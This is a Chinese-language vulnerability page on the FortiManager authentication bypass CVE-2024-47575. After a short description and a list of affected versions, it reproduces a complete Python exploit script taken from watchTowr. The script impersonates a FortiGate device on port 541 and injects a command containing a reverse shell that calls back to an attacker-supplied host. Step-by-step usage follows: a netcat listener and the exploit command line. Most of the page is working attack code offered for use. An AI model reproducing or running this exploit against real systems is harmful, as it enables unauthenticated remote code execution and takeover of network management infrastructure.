# FortiManager身份认证绕过漏洞(CVE-2024-47575)

**Fortinet FortiManager 身份认证绕过漏洞(CVE-2024-47575)**，未经身份验证的远程攻击者可以使用有效的 FortiGate 证书在 FortiManager 中注册未经授权的设备。成功利用漏洞后攻击者将能够查看和修改文件（例如配置文件）以获取敏感信息，并能够管理其他设备执行任意代码或命令。

## **影响版本**

7.6.0 <= FortiManager 7.6.* <= 7.6.0

7.4.0 <= FortiManager 7.4.* <= 7.4.4

7.2.0 <= FortiManager 7.2.* <= 7.2.7

7.0.0 <= FortiManager 7.0.* <= 7.0.12

6.4.0 <= FortiManager 6.4.* <= 6.4.14

6.2.0 <= FortiManager 6.2.* <= 6.2.12

7.4.1 <= FortiManager Cloud 7.4.* <= 7.4.4

7.2.1 <= FortiManager Cloud 7.2.* <= 7.2.7

7.0.1 <= FortiManager Cloud 7.0.* <= 7.0.12

FortiManager Cloud 6.4.*

## poc

脚本来源 https://github.com/watchtowrlabs/Fortijump-Exploit-CVE-2024-47575

```python
import socket
import struct
import ssl
import argparse
import random
from time import sleep



banner = """			 __         ___  ___________                   
	 __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
	 \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
	  \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
	   \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
				  \\/          \\/     \\/                            

        CVE-2024-47575.py
        (*) FortiManager Unauthenticated Remote Code Execution (CVE-2024-47575) exploit by watchTowr
        
          - Sina Kheirkhah (@SinSinology), watchTowr (sina@watchTowr.com)

        CVEs: [CVE-2024-47575]
"""


print(banner)
parser = argparse.ArgumentParser(description='FortiManager CVE-2024-47575 exploit')
parser.add_argument('--target', type=str, help='Target IP', required=True)
parser.add_argument('--lhost', type=str, help='attacker IP', required=False, default='empty')
parser.add_argument('--lport', type=str, help='attacker PORT', required=False, default='empty')
parser.add_argument('--action', type=str, choices=['check', 'exploit'], help='Choose an action: "check" or "exploit"', required=True)
args = parser.parse_args()



if(args.action == "exploit"):
    if(args.lhost == 'empty' or args.lport == 'empty'):
        print("[ERROR] you got an error, because you chose the 'exploit' mode but didnt provide the '--lhost and --lport'")
        exit(1)


# print("[DEBUG] go and run the following command on your fortimanager -> tail -f /var/log/fdssvrd.log")
# input("press enter to continue")


request_getip = b"""get ip
serialno=FGVMEVWG8YMT3R63
mgmtid=00000000-0000-0000-0000-000000000000
platform=FortiGate-VM64
fos_ver=700
minor=2
patch=2
build=1255
branch=1255
maxvdom=2
fg_ip=192.168.1.53
hostname=FGVMEVWG8YMT3R63
harddisk=yes
biover=04000002
harddisk_size=30720
logdisk_size=30235
mgmt_mode=normal
enc_flags=0
first_fmgid=
probe_mode=yes
vdom=root
intf=port1
\0""".replace(b"\n",b"\r\n")



request_auth=b"""get auth
serialno=FGVMEVWG8YMT3R63
mgmtid=00000000-0000-0000-0000-000000000000
platform=FortiGate-60E
fos_ver=700
minor=2
patch=4
build=1396
branch=1396
maxvdom=2
fg_ip=192.168.1.53
hostname=FortiGate
harddisk=yes
biover=04000002
harddisk_size=30720
logdisk_size=30107
mgmt_mode=normal
enc_flags=0
mgmtip=192.168.1.53
mgmtport=443
\0""".replace(b"\n",b"\r\n")




request_file_exchange = b"""get file_exchange
localid=REPLACE_LOCAL_ID
chan_window_sz=32768
deflate=gzip
file_exch_cmd=put_json_cmd

\0""".replace(b"\n", b"\r\n").replace(b"REPLACE_LOCAL_ID", str(random.randint(100,999)).encode())

json_payload = b"""{
    "method": "exec",
    "id": 1,
    "params": [
        {
            "url": "um/som/export",
            "data": {
               "file":"`sh -i >& /dev/tcp/REPLACE_LHOST/REPLACE_LPORT 0>&1`"
            }
        }
    ]
}""".replace(b"REPLACE_LHOST", args.lhost.encode()).replace(b"REPLACE_LPORT", args.lport.encode())
request_channel_open = b"""channel
remoteid=REPLACE_REMOTE_ID

\0""".replace(b"\n", b"\r\n")

request_channel_open += str(len(json_payload)).encode()
request_channel_open += b"\n"
request_channel_open += json_payload
request_channel_open += b"0\n"


request_channel_close = b"""channel
action=close
remoteid=REPLACE_REMOTE_ID

\0""".replace(b"\n", b"\r\n")


def sendmsg(socket, request, recv=True):
    message=struct.pack(">II", 0x36e01100, len(request)+8)+request
    socket.send(message)
    if(not recv):
        return
    hdr=socket.read(8)
    if len(hdr)!=8:
        return hdr
    magic, size=struct.unpack(">II", socket.read(8))
    return socket.read(size)


def create_ssl_sock():
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.load_cert_chain(certfile="w00t_cert.bin", keyfile="w00t_key.bin")  # Load the certificate and key
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    s = socket.create_connection(host, 30)
    ssl_sock = context.wrap_socket(s)
    return ssl_sock

def print_n_sleep(msg, s=0.4):
    print(msg)
    sleep(s)

host = (args.target, 541)

ssl_sock = create_ssl_sock()


response= sendmsg(ssl_sock, request_getip)
# print(response)



response= sendmsg(ssl_sock, request_auth)
# print(response)



response = sendmsg(ssl_sock, request_file_exchange)
remote_id = response.decode().split('\r\n')[1].split('=')[1].strip()

if(remote_id !=None):
    print(f"[VULN] Target is Vulnerable")
else:
    print(f"[SAFE] Target is Safe")
    exit(1)

if(args.action == "check"):
    exit(1)


request_channel_open = request_channel_open.replace(b"REPLACE_REMOTE_ID", remote_id.encode())
response = sendmsg(ssl_sock, request_channel_open, False)

# print(response)



request_channel_close = request_channel_close.replace(b"REPLACE_REMOTE_ID", remote_id.encode())

response = sendmsg(ssl_sock, request_channel_close, True)
# print(response)



```

首先，建立您的 ncat 会话：

```
nc -lvvnp 80
```

然后，执行我们的exp：

```
python3 CVE-2024-47575.py --target 192.168.1.110 --lhost 192.168.1.53 --lport 80 --action exploit
```

要单独检查漏洞，请使用以下选项：

```
python3 CVE-2024-47575.py --target 192.168.1.110 --action check
```

## 漏洞来源

- https://github.com/watchtowrlabs/Fortijump-Exploit-CVE-2024-47575
- https://labs.watchtowr.com/hop-skip-fortijump-fortijumphigher-cve-2024-23113-cve-2024-47575/